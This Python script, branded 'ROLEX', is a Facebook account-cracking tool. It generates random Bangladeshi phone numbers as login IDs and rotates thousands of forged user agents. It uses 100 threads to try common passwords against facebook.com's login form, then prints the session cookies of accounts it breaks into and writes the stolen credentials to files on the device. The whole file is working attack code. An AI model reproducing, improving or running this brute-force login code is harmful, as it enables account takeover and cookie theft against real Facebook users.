
import os
#print("\033[1;92m [+] ROLEX - SYSTEM INSTALLING . . . \033[1;30m")
#os.system('espeak -a 1000 "ROLEX . SYSTEM. INSTALLING"')
#os.system("pkg install espeak")
#print("\033[1;92m   [+] ROLEX - INSTALL COMPLETE \033[1;30m")
#os.system('espeak -a 1000 "ROLEX . INSTALL. COMPLETE"')
#print("\033[1;92m   [+] UPDATE CHECKING \033[1;30m")
#os.system('espeak -a 300 "WAITING. FOR. UPDATE"')
os.system("git pull")
#os.system('espeak -a 300 "TOOLS. is.updated"')
import os,sys,time,json,random,re,string,platform,base64,uuid
from bs4 import BeautifulSoup as sop
from bs4 import BeautifulSoup
from datetime import date
from datetime import datetime
from time import sleep
from os import system as s
from time import sleep as waktu
import requests,bs4,json,os,sys,random,datetime,time,re
import urllib3,rich,base64
from rich.table import Table as me
from rich.console import Console as sol
from bs4 import BeautifulSoup as sop
from concurrent.futures import ThreadPoolExecutor as tred
from rich.console import Group as gp
from rich.panel import Panel as nel
from rich.markdown import Markdown as mark
from rich.columns import Columns as col
from rich import pretty
from rich.text import Text as tekz
from time import localtime as lt
pretty.install()
CON=sol()
try:
    import requests
    from concurrent.futures import ThreadPoolExecutor as ThreadPool
    import mechanize
    from requests.exceptions import ConnectionError
except ModuleNotFoundError:
    os.system('pip install mechanize requests futures bs4==2 > /dev/null')
    os.system('pip install bs4')
   
ugen=[]
useragent=[]
loop = 0
oks = []
cps = []
ugen2=[]
ugen=[]
cokbrut=[]
ses=requests.Session()


for ua in range(2000):
      a='Mozilla/5.0 (iPhone; CPU iPhone OS 8_3 like Mac OS X)'
      b=random.choice(['5.1.1' , '6.0.1' , '7.1.1' , '12' , '13' , '14' , '15'])
      y=random.choice(['SM-J320H' , 'SM-J3109' , 'J320FN' , 'SM-J320P' , 'SM-J320F' , 'SM-J320G' , 'SM-J320Y'])
      c='AppleWebKit/600.1.4 (KHTML, like Gecko) FxiOS/1.0'
      d=random.randrange(40,115)
      e='0'
      f=random.randrange(3000,6000)
      g=random.randrange(20,100)
      h='Mobile/12F69 Safari/600.1.4'
      ug=(f"{a} {b}; {y} {c}{d}.{e}.{f}.{g} {h}")
      ugen.append(ug)
      
for ua in range(200):
      a='Mozilla/5.0 (Linux; U; Android 4.0.2; en-us; Galaxy Nexus Build/ICL53F)'
      b=random.choice(['5.1.1' , '6.0.1' , '7.1.1' , '12' , '13' , '14' , '15'])
      y=random.choice(['SM-J320H' , 'SM-J3109' , 'J320FN' , 'SM-J320P' , 'SM-J320F' , 'SM-J320G' , 'SM-J320Y'])
      c='AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0'
      d=random.randrange(40,115)
      e='0'
      f=random.randrange(3000,6000)
      g=random.randrange(20,100)
      h='Mobile Safari/534.30'
      ug=(f"{a} {b}; {y} {c}{d}.{e}.{f}.{g} {h}")
      ugen.append(ug)

for ua in range(5000):
      a='Mozilla/5.0 (X11; CrOS x86_64 10066.0.0)'
      b=random.choice(['5.1.1' , '6.0.1' , '7.1.1' , '12' , '13' , '14' , '15'])
      y=random.choice(['SM-J320H' , 'SM-J3109' , 'J320FN' , 'SM-J320P' , 'SM-J320F' , 'SM-J320G' , 'SM-J320Y'])
      c='AppleWebKit/537.36 (KHTML, like Gecko)'
      d=random.randrange(40,115)
      e='0'
      f=random.randrange(3000,6000)
      g=random.randrange(20,100)
      h='Chrome/117.0.0.0 Safari/537.36'
      ug=(f"{a} {b}; {y} {c}{d}.{e}.{f}.{g} {h}")
      ugen.append(ug)
#for ua in range(5000):
   #   a='Mozilla/5.0 (Windows NT 10.0; WOW64)'
     # b=random.choice(['5.1.1' , '6.0.1' , '7.1.1' , '12' , '13' , '14' , '15'])
   #   y=random.choice(['SM-J320H' , 'SM-J3109' , 'J320FN' , 'SM-J320P' , 'SM-J320F' , 'SM-J320G' , 'SM-J320Y'])
  #    c='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.99 Safari/537.36 Mozilla/5.0 (Linux; Android 6.0.1; HTC6545LVW Build/MMB29M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/85.0.4183.101'
  #    d=random.randrange(40,115)
 #     e='0'
   #   f=random.randrange(3000,6000)
   #   g=random.randrange(20,100)
   #   h='Mobile Safari/537.36 [FB_IAB/Orca-Android;FBAV/283.0.0.16.120;]'
     # ug=(f"{a} {b}; {y} {c}{d}.{e}.{f}.{g} {h}")
 #     ugen.append(ug)

for ua in range(5000):
    a='NokiaX7-05/8.02-02/2.05-02/2.0'
    b=random.randrange(1,9)
    c='-0'
    d=random.randrange(1,9)
    e='/'
    f=random.randrange(1,9)
    g='.0 ('
    h=random.randrange(1,12)
    i='(2(8(3Profile/MIDP-2.1 Configuration/CLDC-1.1'
    j='UNTRUSTED/1.01.02.0'
    k=random.randrange(1,3)
    l='.0'
    uaku2=f'{a}{b}{c}{d}{e}{f}{g}{h}{i}{j}{k}{l}'
    ugen.append(uaku2)
    
    
#for ua in range(1000):
	
	#rc = random.choice
	#rr = random.randint
	#aZ = ['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z']
	#A = f'Mozilla/5.0 (Linux; Android 6.0{str(rr(5,12))}; OPPO CPH1609 Build/MRA58K'
	#B = f'{str(rc(aZ))}{str(rc(aZ))}{str(rc(aZ))}{str(rr(11,99))}{str(rc(aZ))} '
	#C = f'{str(rr(5,12))}) AppleWebKit/537.36 (KHTML, like Gecko)'
	#D = f'/4.0 Chrome/87.0.4280.86{str(rr(20,100))}.0.{str(rr(1111,9999))}.{str(rr(20,100))}'
	#E = f'Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/392.2.0.33.108;]'
	#F = f'{A}{C}{D}{E}'
	#ugen.append(F)
#for ua in range(5000):
	
	#rc = random.choice
	#rr = random.randint
	#aZ = ['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z']
	#A = f'Mozilla/5.0 (Linux; Android 10.0{str(rr(5,12))}; Samsung SM-A30 Ultra Build/LMY47I'
	#B = f'{str(rc(aZ))}{str(rc(aZ))}{str(rc(aZ))}{str(rr(11,99))}{str(rc(aZ))} '
	#C = f'{str(rr(5,12))}) AppleWebKit/537.36 (KHTML, like Gecko)'
	#D = f'/Chrome/95.0.4638.74{str(rr(20,100))}.0.{str(rr(1111,9999))}.{str(rr(20,100))}'
	#E = f'Mobile Safari/537.36[FBAN/EMA;FBLC/en_GB;FBAV/339.0.0.10.100;]'
	#F = f'{A}{C}{D}{E}'
	#ugen.append(F)
#os.system("clear")
#import getpass

#attemps = 0

#while attemps < 12345677901:
    #username = input(' \033[0;92mEnter Username: ')
    #password = input(' \033[0;93mEnter Password: ')

   # if username == 'ROLEX' and password == 'LOVER':
     #   print(' \033[0;92mYou Have Successfully Logged in.')
     #   break
   # else:
    #    print(' Incorrect Pass Please Trying ')
     #   attemps += 1
     #   continue

os.system('espeak -a 300 "Welcome To"')
os.system('speak -a 300 "SABBIR. HOSSAIN. RAFIS. Tools"')
time.sleep(0.4)

#--------------------[ CONVERTER-BULAN ]--------------#
 
dic = {'1':'January','2':'February','3':'March','4':'April','5':'May','6':'June','7':'July','8':'August','9':'September','10':'October','11':'November','12':'December'}
dic2 = {'01':'January','02':'February','03':'March','04':'April','05':'May','06':'June','07':'July','08':'August','09':'September','10':'October','11':'November','12':'Devember'}
tgl = datetime.datetime.now().day
bln = dic[(str(datetime.datetime.now().month))]
thn = datetime.datetime.now().year
okc = 'OK-'+str(tgl)+'-'+str(bln)+'-'+str(thn)+'.txt'
cpc = 'CP-'+str(tgl)+'-'+str(bln)+'-'+str(thn)+'.txt'
date = str(tgl)+'/'+str(bln)+'/'+str(thn)
ltx = int(lt()[3])
if ltx > 12:
    a = ltx-12
    tag = "PM"
else:
    a = ltx
    tag = "AM"
logo=("""
	\x1b[1;92m$$$$$$$\   $$$$$$\  $$\       $$$$$$$$\ $$\   $$\ 
	\x1b[1;92m$$  __$$\ $$  __$$\ $$ |      $$  _____|$$ |  $$ |
	\x1b[1;92m$$ |  $$ |$$ /  $$ |$$ |      $$ |      \$$\ $$  |
	\x1b[1;92m$$$$$$$  |$$ |  $$ |$$ |      $$$$$\     \$$$$  / 
	\x1b[1;92m$$  __$$< $$ |  $$ |$$ |      $$  __|    $$  $$<  
	\x1b[1;92m$$ |  $$ |$$ |  $$ |$$ |      $$ |      $$  /\$$\ 
	\x1b[1;92m$$ |  $$ | $$$$$$  |$$$$$$$$\ $$$$$$$$\ $$ /  $$ |
	\x1b[1;92m\__|  \__| \______/ \________|\________|\__|  \__|

---------------\x1b[1;91mCoded BY  : \x1b[1;95mMD Sabbir Hossain Rafi
---------------\x1b[1;92mTools Type:\x1b[1;92m Random🔰
""")
A = '\x1b[1;97m' 
B = '\x1b[1;96m' 
C = '\x1b[1;91m' 
D = '\033[38;5;46m'
M = '\033[1;31m'
H = '\033[38;5;46m'
N = '\x1b[1;37m'    
E = '\x1b[1;93m' 
F = '\x1b[1;94m'
G = '\x1b[1;95m'
P = '\033[1;37m'


def fuck():
    user=[]
    os.system('clear')
    time.sleep(0.8)
    print(logo)
    os.system('espeak -a 300 "What. is. your. name"')
    uname =input('\033[1;97m[\033[1;92m+\033[1;97m]\033[1;92m What is Your Name \033[1;91m: \33[1;32m')
    print('[+] SIM CODE BD=> 016-017-018-019')
    nude = input('\033[1;32m[\033[1;32m+\033[1;32m] SIM CODE : ')
    nudex = ''.join(random.choice(string.digits) for _ in range(2))
    nud = ''.join(random.choice(string.digits) for _ in range(2))
    date = str(tgl)+'/'+str(bln)+'/'+str(thn)
    print('[+] 2000;5000;10000;15000;50000')
    limit = int(input('[?] ENTER YOUR CRACK LIMIT : '))
    for nmbr in range(limit):
        nmp = ''.join(random.choice(string.digits) for _ in range(4))
        user.append(nmp)
    with ThreadPool(max_workers=100) as turag:
        os.system('clear')
        print(logo)
        tl = str(len(user))
        print(f"\033[97;1m[\033[92;1m+\033[97;1m] \033[1;92mUSER NAME\033[1;91m :\033[1;96m "+uname)
        os.system('espeak -a 1000 "Welcome"' +uname)
        print('\033[1;37m[\033[1;32m+\033[1;32m] SIM CODE : '+nude)
        print('\033[1;37m[\033[1;32m+\033[1;32m] TOTAL ID : '+tl)
        print("\033[97;1m[\033[92;1m+\033[97;1m] \033[0;93mTODAY'S DATE :\033[1;92m "+date)
        print('\033[0;91m===============================================')
        #print('\033[1;32m\n')
        
        
        for guru in user:
            uid = nude+nudex+nud+guru
            pwx = [nude+nudex+nud+guru,nud+guru,nudex+guru,nude+nudex+nud,'bangla','i love you','sabbir1234','rafi143','@@##%%','bangladesh','Bangladesh','57273200','102030','506070','304050']
            turag.submit(rcrack,uid,pwx,tl)
    
    print('\033[1;37m[\033[1;32m~\033[1;37m] CRACK SUCCESSFULLY COMPLETED..')
    
def rcrack(uid,pwx,tl):
    global loop
    global cps
    global oks
    global proxy
    try:
        for ps in pwx:
            pro = random.choice(ugen)
            session = requests.Session()
            bi = random.choice([A,B,C,D,E,F,G,H])
            sys.stdout.write(f'\r \033[1;31m[%sRolex\033[1;31m]\033[1;34m\033[1;31m[\033[38;5;195m%s/%s\033[1;31m]\033[1;34m\033[38;5;45mOK-\033[38;5;46m%s\r'%(bi,loop,tl,len(oks))),
            sys.stdout.flush()
            free_fb = session.get('https://free.facebook.com').text
            log_data = {
                "lsd":re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
            "jazoest":re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
            "m_ts":re.search('name="m_ts" value="(.*?)"', str(free_fb)).group(1),
            "li":re.search('name="li" value="(.*?)"', str(free_fb)).group(1),
            "try_number":"0",
            "unrecognized_tries":"0",
            "email":uid,
            "pass":ps,
            "login":"Log In"}
            header_freefb = {'authority':'www.facebook.com',
'method':'POST',
'path':'/?_rdr',
'scheme':'https',
'Accept':'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
'Accept-Encoding':'gzip, deflate, br',
'Accept-Language':'en-US,en;q=0.9',
'Cache-Control':'max-age=0',
'Sec-Ch-Prefers-Color-Scheme':'light',
'Sec-Ch-Ua':'"Google Chrome";v="117", "Not;A=Brand";v="8", "Chromium";v="117"',
'Sec-Ch-Ua-Full-Version-List':'"Google Chrome";v="117.0.5938.92", "Not;A=Brand";v="8.0.0.0", "Chromium";v="117.0.5938.92"',
'Sec-Ch-Ua-Mobile':'?0',
'Sec-Ch-Ua-Model':"",
'Sec-Ch-Ua-Platform':"Windows",
'Sec-Ch-Ua-Platform-Version':"10.0.0",
'Sec-Fetch-Dest':'document',
'Sec-Fetch-Mode':'navigate',
'Sec-Fetch-Site':'same-origin',
'Sec-Fetch-User':'?1',
'Upgrade-Insecure-Requests':'1',
'User-Agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Safari/537.36',
'Viewport-Width':'518',}
            lo = session.post('https://www.facebook.com/login/?next&ref=dbl&fl&login_from_aymh=1&refid=8',data=log_data,headers=header_freefb).text
            log_cookies=session.cookies.get_dict().keys()
            if 'c_user' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[65:80]
                print(f"\033[38;5;46m[Successful] {cid} <> {ps}" '  \n\033[1;33m []\033[1;33mCookie = \033[1;32m'+coki+  ' \n\033[1;33m [] \033[1;32mUa = \033[1;34m'+pro+'  \033[0;97m')
                #print(f'\r\33[1;92m [Hack-Done💥] '+cid+''+ids+''+uid+' | '+ps+'\33[0;92m')
                os.system('espeak -a 300 "Congratulations. ok id"')
                open('/sdcard/Rolex-OK.txt', 'a').write( uid+' | '+ps+'\n')
                oks.append(uid)
                break
            elif 'checkpoint' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[65:80]
               # print(f"\033[38;5;41m[BAD-LUCK⚠️] {cid} <> {ps}")
                #print(f"\033[38;5;46m[OK] {uid} <> {ps}" '  \n\033[1;33m []\033[1;33mCookie = \033[1;32m'+coki+  ' \n\033[1;33m [] \033[1;32mUa = \033[1;34m'+pro+'  \033[0;97m')
                #print(f'\r\33[1;92m [Hack-Done💥] '+cid+''+ids+''+uid+' | '+ps+'\33[0;92m')
              #  print(f'\r\33[1;92m [🔢] Numer : {uid}')
                #print(f'\r\033[1;92m [🍪] COOKIE : '+coki)
				#print(f'\r\033[1;92m [] \033[1;32mUa = \033[1;34m'+pro+'  \033[0;97m')
                os.system('espeak -a 300 " cp. id"')
                open('/sdcard/Rolex-CP.txt', 'a').write( uid+' | '+ps+' \n')
                cps.append(uid)
                break
            else:
                continue
        loop+=1
        
    except:
        pass

fuck()